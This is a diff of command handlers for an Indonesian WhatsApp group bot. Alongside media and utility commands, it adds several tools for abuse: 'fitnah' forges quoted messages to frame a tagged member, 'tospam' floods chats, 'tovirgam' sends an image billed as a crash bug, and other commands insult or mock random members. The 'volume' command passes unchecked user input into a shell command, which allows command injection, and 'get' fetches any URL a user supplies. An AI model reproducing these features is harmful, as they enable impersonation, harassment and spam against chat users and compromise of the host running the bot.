+					xdev.sendMessage(from, 'Pertanyaan : *'+sange+'*\n\nJawaban : '+ nge+'%', text, { quoted: dev })
+					break
+					
+case 'gaycek':
+					gayy = body.slice(1)
+					const gay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					const yag = gay[Math.floor(Math.random() * gay.length)]
+					xdev.sendMessage(from, 'Pertanyaan : *'+gayy+'*\n\nJawaban : '+ yag+'%', text, { quoted: dev })
+					break
+					
+case 'lesbicek':
+					lesbii = body.slice(1)
+					const lesbi =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					const bo = lesbi[Math.floor(Math.random() * lesbi.length)]
+					xdev.sendMessage(from, 'Pertanyaan : *'+lesbii+'*\n\nJawaban : '+ bo+'%', text, { quoted: dev })
+					break
+					
+case 'gantengcek':
+					ganteng = body.slice(1)
+					const gan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					const teng = gan[Math.floor(Math.random() * gan.length)]
+					xdev.sendMessage(from, 'Pertanyaan : *'+ganteng+'*\n\nJawaban : '+ teng+'%', text, { quoted: dev })
+					break
+					
+case 'cantikcek':
+					cantik = body.slice(1)
+					const can =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					const tik = can[Math.floor(Math.random() * can.length)]
+					xdev.sendMessage(from, 'Pertanyaan : *'+cantik+'*\n\nJawaban : '+ tik+'%', text, { quoted: dev })
+					break
+					
+case 'watak':
+					watak = body.slice(1)
+					const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
+					const tak = wa[Math.floor(Math.random() * wa.length)]
+					xdev.sendMessage(from, 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak, text, { quoted: dev })
+					break
+				
+case 'hobby':
+					hobby = body.slice(1)
+					const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
+					const by = hob[Math.floor(Math.random() * hob.length)]
+					xdev.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: dev })
+					break
+					case 'babi':
+ if(!isGroup) return setReply("Hanya bisa di group")
+              membr = []
+              const meg = groupMembers
+              const mge = groupMembers
+              const ba = meg[Math.floor(Math.random() * meg.length)]
+              const bua = pushname[Math.floor(Math.random() * mge.length)]
+              teks = `Yang Paling Babi Disini Adalah : @${ba.jid.split('@')[0]}`
+              membr.push(ba.jid)
+              mentions(teks, membr, true)
+              break
+       case 'beban':
+        if(!isGroup) return setReply("Hanya bisa di group")
+              membr = []
+              const ngewe = groupMembers
+              
+              const beb = ngewe[Math.floor(Math.random() * ngewe.length)]
+              
+              teks = `Yang Paling Beban Disini Adalah : @${beb.jid.split('@')[0]}`
+              membr.push(beb.jid)
+              mentions(teks, membr, true)
+              break
+
+
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+       case 'tovirgam':
+       case 'jadivirgam':
+        if (!isOwner) return onlyOwner()
+					if (!isQuotedSticker) return setReply('Reply stiker nya')
+					if (isQuotedSticker){
+						const encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
+						const media = await xdev.downloadAndSaveMediaMessage(encmedia)
+						ran = '1000.png'
+						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
+							fs.unlinkSync(media)
+							if (err) return setReply(mess.error.api)
+							buffer = fs.readFileSync(ran)
+							xdev.sendMessage(from, buffer, image, {quoted: dev, thumbnail:virgam, caption: 'Nih Fotonya\n\n⚠️*Perhatian.!!*⚠️\nFoto ini Mengandung Virgam/Bug SW!!'})
+							fs.unlinkSync(ran)
+						})
+					}
+					break
+           
+           
+           
+case 'out':
+case 'leave':
+if (!isGroup) return 
+if (!isOwner) return onlyOwner()
+if (!isOwner && autosticker) return sendSticker(gaboleh)
+xdev.groupLeave(from)
+break
+						
+						
+						
+case 'reportbug':
+case 'bugreport':
+case 'laporbug':
+if(!q) return setReply(`Masukan laporan bug dengan teks atau reply gambar screenshot dengan teks\nLaporan yang main-main tidak akan di tanggapi`)
+if (isMedia && !dev.message.videoMessage || isQuotedImage) {
+if(!q) return setReply("Masukan laporan bug yang di alami")
+const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+buff = await xdev.downloadMediaMessage(encmedia)
+let mok = [{"buttonId": `${prefix}banuser ${sender}`,"buttonText": {"displayText": `ʙᴀɴɴᴇᴅ`},"type": "RESPONSE"},
+                    {"buttonId": `${prefix}thanksuser ${sender}`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"}]
+teks =`*「 Laporan Bug 」*\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nInfo laporan : \n\n${q}\n\n\n                             ${calender}\n` 
+mhan = await xdev.prepareMessage(from, buff, image)
+locmhan = mhan.message["ephemeralMessage"] ? mhan.message.ephemeralMessage : mhan
+let nanu = {
+imageMessage: locmhan.message.imageMessage,
+contentText:  teks,
+footerText: copyright,
+buttons: mok,
+headerType: 4
+}
+await xdev.sendMessage(Ownerin, nanu, MessageType.buttonsMessage, {quoted: setQuoted})
+await xdev.modifyChat(Ownerin, ChatModification.delete)
+await xdev.sendMessage(from,"Laporan bug telah dikirim ke developer",text)
+} else {
+let mok = [{"buttonId": `${prefix}banuser ${sender}`,"buttonText": {"displayText": `ʙᴀɴɴᴇᴅ`},"type": "RESPONSE"},
+                    {"buttonId": `${prefix}thanksuser ${sender}`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"}]
+teks =`*「 Laporan Bug 」*\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nInfo laporan : \n\n${q}\n\n\n                             ${calender}\n`
+
+let lol = {
+contentText: teks,
+footerText: copyright,
+buttons: mok,
+headerType: 1,
+}
+await xdev.sendMessage(Ownerin, lol, MessageType.buttonsMessage, {quoted: setQuoted})
+await xdev.modifyChat(Ownerin, ChatModification.delete)
+await xdev.sendMessage(from,"Laporan bug telah dikirim ke developer",text)
+}
+break
+						
+						
+case 'thanksuser':{
+if(!q) return setReply("Masukan nomer")
+let mok = [{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
+                    {"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"}]
+teks =`
+Terimakasih atas laporan bug
+yang kamu berikan, Kami akan 
+memperbaiki bug tersebut
+secepat mungkin, Jika sudah di fix
+Kami akan mengupload ke repository,
+Selalu cek Repository kami
+untuk melihat update terbaru
+
+${calender}
+_Thanks for choosing ${fake}_`
+xdev.updatePresence(from, Presence.composing)
+await sendButMessage (q, teks, `©Developer`, mok)
+await xdev.modifyChat(Ownerin, ChatModification.delete)
+}
+break
+						
+case 'banuser':
+if (!isOwner) return setReply(mess.only.Bowner)
+if(!q) return setReply(`Masukan Id whatsapp`)
+nama = xdev.contacts[q] != undefined ? xdev.contacts[q].notify = undefined ? PhoneNumber('+' + q.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[q].notify || xdev.contacts[q].vname : PhoneNumber('+' + q.replace('@s.whatsapp.net', '')).getNumber('international')
+if(cekBannedUser (q, ban)) return setReply("Udah di ban kak")
+addBanned(nama,calender,  q, ban)               
+teks =`
+Kamu telah di banned karena
+menyalahgunakan Fitur _*reportbug*_
+
+Nama: ${nama}
+Nomer: ${q.split("@")[0]}
+Tanggal: ${calender}
+Total Banned : ${JSON.parse(fs.readFileSync('./database/banned.json')).length}
+
+${copyright}`
+xdev.updatePresence(from, Presence.composing)
+await xdev.sendMessage(q, teks, text)
+await xdev.modifyChat(Ownerin, ChatModification.delete)
+break
+						
+						
+					
+						
+case 'tts':	
+try{
+if (args.length < 1) return setReply('Kode bahasanya mana kak?')
+if (args.length < 2) return setReply('Textnya mana kak?')
+gtts = require('./lib/gtts')(args[1])
+dtt = q
+ranm = getRandom('.mp3')
+if(dtt.length > 600) return setReply('Textnya kebanyakan kak') 
+gtts.save(ranm, dtt, function() {
+xdev.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: dev, mimetype: 'audio/mp4', ptt:true})
+fs.unlinkSync(ranm)
+})  
+ } catch (err){
+console.log(err)
+console.log(color("Auto turn to id of tts"))
+gtts = require('./lib/gtts')("id")
+dtt = q
+ranm = getRandom('.mp3')
+if(dtt.length > 600) return setReply('Textnya kebanyakan kak') 
+gtts.save(ranm, dtt, function() {
+xdev.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: dev, mimetype: 'audio/mp4', ptt:true})
+fs.unlinkSync(ranm)
+})
+}
+break
+						
+						
+				
+						
+           
+           
+           
+           
+           
+           
+
+
+
+           
+           
+           
+           
+           
+          
+           
+           
+				
+					
+		
+					 
+					
+					
+					
+case 'volume':
+if (Number(args[0]) >= 11) return setReply("Maksimal volume adalah 10")
+if (!isQuotedAudio) return setReply('Reply audio!')
+let encmedia3 = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
+let media3 = await xdev.downloadAndSaveMediaMessage(encmedia3)
+rname = getRandom('.mp3')
+exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, (err, stderr, stdout) => {
+fs.unlinkSync(media3)
+if (err) return setReply('Error!')
+jadie = fs.readFileSync(rname)
+xdev.sendMessage(from, jadie, audio, {mimetype: 'audio/mp4', ptt: true, quoted: setQuoted})
+fs.unlinkSync(rname)
+}
+)
+break
+					
+					
+                 
+                 
+                 
+           
+           
+           
+           case 'clear':
+               if (!isOwner) return onlyOwner()
+                aw = ('succes delete this chat')
+                console.log(color('[succes delete chat =]','gold')+ color('dari', 'cyan'), color(`${pushname}`, 'purple'))
+                xdev.modifyChat(from, ChatModification.delete)                
+                break
+           
+           case 'delchat':
+               if (!isOwner) return onlyOwner()
+                aw = ('succes delete this chat')
+                console.log(color('[succes delete chat =]','gold')+ color('dari', 'cyan'), color(`${pushname}`, 'purple'))
+                xdev.modifyChat(from, ChatModification.delete)
+                setTimeout( () => {
+                xdev.sendMessage(from, aw, text)
+                },3000)
+                break
+           
+           case 'closetime': 
+				if (!isGroupAdmins) return sendSticker(hanyaadmin)
+			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
+              if (args[1]=="detik") {var timer = args[0]*`1000`
+				} else if (args[1]=="menit") {var timer = args[0]*`60000`
+				} else if (args[1]=="jam") {var timer = args[0]*`3600000`
+				} else if (args[1]=="hari") {var timer = args[0]*`86400000`
+				} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
+				sendMess(`Close time ${q} dimulai dari sekarang`)
+				setTimeout( () => {
+					var nomor = dev.participant
+					const close = {
+					text: `*Tepat waktu* grup ditutup oleh admin  @${nomor.split("@s.whatsapp.net")[0]}\nsekarang hanya admin yang dapat mengirim pesan`,
+					contextInfo: { mentionedJid: [nomor] }
+					}
+					xdev.groupSettingChange (from, GroupSettingChange.messageSend, true);
+					setReply(close)
+				}, timer)
+				break
+				
+				
+case 'opentime':        
+			if (!isGroupAdmins) return sendSticker(hanyaadmin)
+			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
+               if (args[1]=="detik") {var timer = args[0]*`1000`
+				} else if (args[1]=="menit") {var timer = args[0]*`60000`
+				} else if (args[1]=="jam") {var timer = args[0]*`3600000`
+				} else if (args[1]=="hari") {var timer = args[0]*`86400000`
+				} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
+				sendMess(`Open time ${q} dimulai dari sekarang`)
+				setTimeout( () => {
+					var nomor = dev.participant
+					const open = {
+					text: `*Tepat waktu* grup dibuka oleh admin @${nomor.split("@s.whatsapp.net")[0]}\n sekarang member dapat mengirim pesan`,
+					contextInfo: { mentionedJid: [nomor] }
+					}
+					xdev.groupSettingChange (from, GroupSettingChange.messageSend, false);
+					setReply(open)
+				}, timer)
+				break
+				
+				
+				
+case 'nuliskiri':{
+                if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+                if (!q) return setReply(`Kirim perintah *${prefix}nuliskiri* teks`)
+                setReply(mess.wait)                
+                const splitText = q.replace(/(\S+\s*){1,9}/g, '$&\n')
+                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
+                spawn('convert', [
+                    './temp/nulis/images/buku/sebelumkiri.jpg',
+                    '-font','./temp/nulis/font/Indie-Flower.ttf',
+                    '-size','960x1280',
+                    '-pointsize','22',
+                    '-interline-spacing','2',
+                    '-annotate','+140+153',
+                    fixHeight,'./temp/nulis/images/buku/setelahkiri.jpg'
+                ])
+                .on('error', () => setReply("Error Bjeer, Keknya Scriptnya Lagi Error"))
+                .on('exit', () => {
+                    xdev.sendMessage(from, fs.readFileSync('./temp/nulis/images/buku/setelahkiri.jpg'), image, {quoted: dev, caption: `Nih...`})
+                    limitAdd(senderNumber, user)
+                })
+            }
+           break
+                
+                case 'nuliskanan':{
+                if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+                if (!q) return setReply(`Kirim perintah *${prefix}nuliskanan* teks`)
+                setReply(mess.wait)
+                const splitText = q.replace(/(\S+\s*){1,9}/g, '$&\n')
+                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
+                spawn('convert', [
+                    './temp/nulis/images/buku/sebelumkanan.jpg',
+                    '-font','./temp/nulis/font/Indie-Flower.ttf',
+                     '-size', '960x1280',
+                    '-pointsize','23',
+                    '-interline-spacing','2',
+                    '-annotate','+128+129',
+                    fixHeight, './temp/nulis/images/buku/setelahkanan.jpg'
+                ])
+                .on('error', () => setReply("Error Bjeer, Keknya Scriptnya Lagi Error"))
+                .on('exit', () => {
+                    xdev.sendMessage(from, fs.readFileSync('./temp/nulis/images/buku/setelahkanan.jpg'), image, {quoted: dev, caption: `Nih...`})
+                    limitAdd(senderNumber, user)
+                })
+            }
+             break
+            case 'foliokiri':{
+                if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+                if (!q) return setReply(`Kirim perintah *${prefix}foliokiri* teks`)
+                setReply(mess.wait)
+                const splitText = q.replace(/(\S+\s*){1,13}/g, '$&\n')
+                const fixHeight = splitText.split('\n').slice(0, 10).join('\n')
+                spawn('convert', [
+                    './temp/nulis/images/folio/sebelumkiri.jpg',
+                    '-font',
+'./temp/nulis/font/Indie-Flower.ttf',
+                    '-size',
+'3200x2180',
+                     '-pointsize',
+'55',
+                     '-interline-spacing',
+'2',
+                     '-annotate',
+'+80+390',
+                    fixHeight,
+'./temp/nulis/images/folio/setelahkiri.jpg'
+                ])
+                .on('error', () => setReply("Error Bjeer, Keknya Scriptnya Lagi Error"))
+                .on('exit', () => {
+                    xdev.sendMessage(from, fs.readFileSync('./temp/nulis/images/folio/setelahkiri.jpg'), image, {quoted: dev, caption: `Nih...`})
+                    limitAdd(senderNumber, user)
+                })
+            }
+                break
+                
+            case 'foliokanan':{
+                if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+                if (!q) return setReply(`Kirim perintah *${prefix}foliokanan* teks`)
+                setReply(mess.wait)
+                const splitText = q.replace(/(\S+\s*){1,13}/g, '$&\n')
+                const fixHeight = splitText.split('\n').slice(0, 10).join('\n')
+                spawn('convert', [
+                    './temp/nulis/images/folio/sebelumkanan.jpg',
+                    '-font',
+'./temp/nulis/font/Indie-Flower.ttf',
+                    '-size',
+'3200x2180',
+                    '-pointsize',
+'55',
+                    '-interline-spacing',
+'2',
+                    '-annotate',
+'+130+400',
+                    fixHeight,
+'./temp/nulis/images/folio/setelahkanan.jpg'
+                ])
+                .on('error', () => setReply("Error Bjeer, Keknya Scriptnya Lagi Error"))
+                .on('exit', () => {
+                    xdev.sendMessage(from, fs.readFileSync('./temp/nulis/images/folio/setelahkanan.jpg'), image, {quoted: dev, caption: `Nih...`})
+                    limitAdd(senderNumber, user)
+                })
+            }
+                break
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+
+       
+            
+          case 'getfp':
+         case 'getpp':
+				if (isGroup) { 
+				if(q) return setReply("Jangan di tag")
+				 if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return setReply("Reply Targetnya")
+				setReply(mess.wait)
+			     kicknya = dev.message.extendedTextMessage.contextInfo.participant
+			     try {
+                 pic = await xdev.getProfilePicture(kicknya)
+                 } catch {
+                pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
+                }
+                onichan = await getBuffer(pic)
+				xdev.sendMessage(from, onichan, image, {quoted: setQuoted})
+                } else {
+                setReply(mess.wait)
+                linkpp = await xdev.getProfilePicture(from) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
+                buffer = await getBuffer(linkpp)
+               xdev.sendMessage(from, buffer, image, {caption: "Nih", quoted: dev })
+               }     
+               break
+            
+            
+            
+               
+            case 'getbio':
+            if(isGroup){
+         if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return setReply("Reply Targetnya")
+	  setReply(mess.wait)
+	  var yy = dev.message.extendedTextMessage.contextInfo.participant
+var p = await xdev.getStatus(`${yy}`, MessageType.text)
+setReply(p.status)
+} else{
+setReply(mess.wait)
+var a = await xdev.getStatus(from, MessageType.text)
+setReply(a.status)
+}
+break
+           
+           
+           
+           
+           
+
+
+           
+           
+
+           
+           
+case 'tospam':
+if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return setReply('Reply targetnya!')
+if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
+teks = body.slice(8)
+oi1 = teks.split('|')[0]
+oi2 = teks.split('|')[1]
+if (Number(oi2) >= 50) return setReply('Kebanyakan!')
+if (!Number(oi2)) return setReply('Jumlah harus berupa angka!')
+	  for (let i = 0; i < oi2; i++) {
+	  xdev.sendMessage(from, `${oi1}`, MessageType.text)
+	  }
+} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
+teks = dev.message.extendedTextMessage.contextInfo.quotedMessage.conversation
+if (!Number(args[0])) return setReply('Jumlah harus berupa angka!')
+if (Number(args[0]) >= 50) return setReply('Kebanyakan!')
+	  for (let i = 0; i < args[0]; i++) {
+	  xdev.sendMessage(from, teks, MessageType.text)
+	  }
+} else if (isQuotedSticker) {
+	encmedian = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
+	         median = await xdev.downloadAndSaveMediaMessage(encmedian)
+				ara = fs.readFileSync(median)
+	if (!Number(args[0])) return setReply('Jumlah harus berupa angka!')
+	if (Number(args[0]) >= 50) return setReply('Kebanyakan!')
+	  for (let i = 0; i < args[0]; i++) {
+	  sendSticker(ara)
+	  }
+} else if (isQuotedAudio) {
+	encmediat = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
+	            mediat = await xdev.downloadAndSaveMediaMessage(encmediat)
+				ara = fs.readFileSync(mediat)
+	if (!Number(args[0])) return setReply('Jumlah harus berupa angka!')
+	if (Number(args[0]) >= 50) return setReply('Kebanyakan!')
+	  for (let i = 0; i < args[0]; i++) {
+	  xdev.sendMessage(from, ara, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
+	  }
+} else if (isQuotedImage) {
+	boij = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
+	delb = await xdev.downloadMediaMessage(boij)
+	teks = body.slice(6)
+	oi1 = teks.split('|')[0]
+oi2 = teks.split('|')[1]
+if (Number(oi2) >= 50) return setReply('Kebanyakan!')
+	if (!Number(oi2)) return setReply('Jumlah harus berupa angka!')
+	  for (let i = 0; i < oi2; i++) {
+	  xdev.sendMessage(from, delb, MessageType.image, {caption: oi1})
+	  }
+}
+	  break
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+    case 'delvote':
+            if(!dev.key.remoteJid) return
+            if(isVote) return setReply('Tidak ada sesi Voting')
+            delVote(from)
+            setReply('Sukses Menghapus sesi Voting Di Grup Ini')
+            break
+    case 'voting':
+            if(!isGroupAdmins && !dev.key.fromMe) return 
+            if(!isGroup) return setReply(mess.only.group)
+            if(!q) return setReply('*Voting*\n\n'+ prefix+ 'voting @tag target | reason  | 1 (1 = 1 Menit)')
+            if (isVote) return setReply('Sesi Voting Sedang Berlangsung Di Grup Ini')            
+            if (dev.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || dev.message.extendedTextMessage.contextInfo == null) {
+            let id = dev.message.extendedTextMessage.contextInfo.mentionedJid[0]
+            split = args.join(' ').replace('@', '').split('|')
+            if(!Number(split[2])) return setReply('masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit')
+            await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai' +'\n\n' + `ketik vote untuk setuju \nketik devote untuk tidak setuju\n-Huruf kecil semua\n\nvote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
+            addVote(from,split[1],split[0],split[2],reply)
+            }
+            break
+            
+            
+
+    
+    
+    
+    
+    
+    
+    
+    case 'caripesan':
+            if(!q)return setReply('pesannya apa bang?')
+            let v = await xdev.searchMessages(q,from,10,1)
+            let s = v.messages
+            let el = s.filter(v => v.message)
+            el.shift()
+            try {
+            if(el[0].message.conversation == undefined) return
+            setReply(`Ditemukan ${el.length} pesan`)
+            await sleep(3000)
+            for(let i = 0; i < el.length; i++) {
+            await xdev.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
+            }
+            } catch(e){
+            setReply('Pesan tidak ditemukan!')
+            }           
+            break
+            
+
+    
+    case 'on': 
+             if (!isOwner) return onlyOwner()
+            offline = false
+            setReply(' ANDA TELAH ONLINE')
+            break       
+    case 'statuson':
+            setReply(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${publik ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
+            break
+    case 'off':
+            if (!isOwner) return onlyOwner()
+            if(!q) return reply ("Alasanya apa kak ?")
+            if (!dev.key.fromMe && !isOwner) return 
+            offline = true
+            waktu = Date.now()
+            anuu = q ? q : '-'
+            alasan = anuu
+            setReply(`Anda telah offline dengan alasan ${q}`)
+            break   
+    case 'get':
+            if(!q) return setReply('linknya?')
+            fetch(`${args[0]}`).then(res => res.text())  
+            .then(bu =>{
+            setReply(bu)
+            })   
+            break
+     
+
+
+
+case 'google':
+              if (!q) return setReply('masukan teks')
+              if(q == undefined || q == ' ') return setReply(`*Hasil Pencarian : ${q}* tidak ditemukan`)
+               ggs = require('google-it')
+              ggs({ 'query': q }).then(results => {
+              vars =``
+              vars += `_*Hasil Pencarian : ${q}*_\n`
+              for (let i = 0; i < results.length; i++) {
+              vars +=  `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
+}
+var lama = vars.trim()
+               xdev.sendMessage(from, lama, text, {quoted : dev })
+               })
+               break
+
+
+					
+					
+					case 'setnamebot':
+					case 'setbotname':
+					if (!isOwner) return onlyOwner()
+					setReply(`Berhasil mengubah nama bot ke ${q}`)
+					fake = `${q}`
+					break
+					
+					case 'forwardtotal':
+					case 'totalforward':
+					if(forwarding === false) return setReply("Aktifkan fitur forward")
+					if (!isOwner) return onlyOwner()
+					if(!q) return setReply(`Jumlah forwardnya berapa kak\ncontoh : 1, 100, 1000, 100000`)
+					setReply(`Berhasil mengubah total forward ke ${q}`)
+					totalForward = `${q}`
+					break
+					
+					
+					
+					
+
+
+
+			       
+		     
+
+
+
+
+
+                    
+                
+
+
+     
+
+
+
+
+
+    case 'kontag':
+        if(!q) return setReply(`penggunaan ${prefix}kontak nomor| nama`)
+            if (!dev.key.fromMe && !isOwner && !isGroupAdmins) return setReply(mess.only.admin)
+            pe = args.join('')
+            entah = pe.split('|')[0]
+            nah = pe.split('|')[1]
+            if (isNaN(entah)) return setReply('Invalid phone number');
+            members_ids = []
+            for (let mem of groupMembers) {
+            members_ids.push(mem.jid)
+            }
+            vcard = 'BEGIN:VCARD\n'
+            + 'VERSION:3.0\n'
+            + `FN:${nah}\n`
+            + `TEL;type=CELL;type=VOICE;waid=${entah}:${PhoneNumber('+' + entah).getNumber('internasional')}\n`
+            + 'END:VCARD'.trim()
+            xdev.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
+            break
+    
+    case 'fitnah':
+    try{
+    if(!isGroup) return setReply("Hanya bisa di group tod")
+    if(!q) return setReply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
+           // if (args.length < 2) return setReply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
+            var gh = args.join(" ")
+            mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid
+            var replace = gh.split("|")[0];
+            var target = gh.split("|")[1];
+            var bot = gh.split("|")[2];
+            xdev.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
+            } catch (err){
+            	setReply(`Error ngab, penggunaan :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
+            }
+            break
+    
+         
+   
+    case 'tomp3':
+            if (isQuotedVideo) {
+            setReply(mess.wait)
+            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
+            media = await xdev.downloadAndSaveMediaMessage(encmedia)
+            ran = getRandom('.mp3')
+            exec(`ffmpeg -i ${media} -vn ${ran}`, (err) => {
+            fs.unlinkSync(media)
+            if (err) return setReply(`Err: ${err}`)
+            buffer453 = fs.readFileSync(ran)
+            xdev.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: dev })
+            fs.unlinkSync(ran)
+            })
+            } else {
+            setReply("Reply videonya")
+            }
+            break
+            
+            
+
+    
+    case 'fast':
+            if (isQuotedVideo) {
+            setReply(mess.wait)
+            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
+            media = await xdev.downloadAndSaveMediaMessage(encmedia)
+            ran = getRandom('.mp4')
+            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
+            fs.unlinkSync(media)
+            if (err) return setReply(`Err: ${err}`)
+            buffer453 = fs.readFileSync(ran)
+            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
+            fs.unlinkSync(ran)
+            })
+            } else {
+            setReply('Reply videonya!')
+            }
+            break
+            
+    case 'slow':  
+            if (isQuotedVideo){ 
+            setReply(mess.wait)
+            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
+            media = await xdev.downloadAndSaveMediaMessage(encmedia)
+            ran = getRandom('.mp4')
+            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
+            fs.unlinkSync(media)
+            if (err) return setReply(`Err: ${err}`)
+            buffer453 = fs.readFileSync(ran)
+            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
+            fs.unlinkSync(ran)
+            })
+            } else {
+            setReply('Reply videonya!')
+            }
+            break
+            
+            case 'hode':
+  if(isQuotedAudio) { 
+            setReply(mess.wait)
+					encmedia5 = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
+					medok = await xdev.downloadAndSaveMediaMessage(encmedia5)
